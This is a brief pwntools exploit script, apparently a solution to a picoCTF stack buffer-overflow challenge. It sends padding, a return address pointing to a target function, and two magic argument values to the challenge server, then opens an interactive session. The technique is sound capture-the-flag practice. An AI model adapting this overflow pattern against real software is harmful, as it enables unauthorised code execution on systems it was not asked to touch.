from pwn import *

#p = process('./vuln')
p = remote('saturn.picoctf.net', '60565')
p.sendline(b'a'*112+ p32(0x08049296)+b'b'*4+p32(0xCAFEF00D)+p32(0xF00DF00D))

p.interactive()
